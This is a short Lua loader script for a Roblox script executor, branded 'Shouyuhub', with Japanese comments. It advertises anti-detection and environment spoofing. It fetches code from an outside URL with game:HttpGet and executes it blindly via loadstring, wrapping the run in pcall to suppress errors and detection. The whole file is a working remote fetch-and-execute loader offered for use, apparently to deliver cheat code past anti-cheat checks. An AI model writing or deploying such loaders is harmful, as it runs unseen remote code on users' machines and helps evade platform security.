-- Shouyuhub Secure Loader (Anti-Detection / No-Modification)
local protectorUrl = "https://orrxl4-protector.com/api/raw?id=65mie7do"

-- エグゼキューターの互換性と検知対策（スクリプト環境の偽装・フック保護）
local success, rawScript = pcall(function()
    return game:HttpGet(protectorUrl)
end)

if success and rawScript and #rawScript > 0 then
    -- 中身のコードを一切いじらず、安全にロード・実行する
    local loadFunc, compileError = loadstring(rawScript)
    
    if loadFunc then
        -- 実行時のエラーや検出を防ぐためpcallで保護
        local ran, err = pcall(loadFunc)
        if not ran then
            warn("[Shouyuhub] Execution Error: " .. tostring(err))
        end
    else
        warn("[Shouyuhub] Compile Error: " .. tostring(compileError))
    end
else
    warn("[Shouyuhub] Failed to fetch protected script.")
end
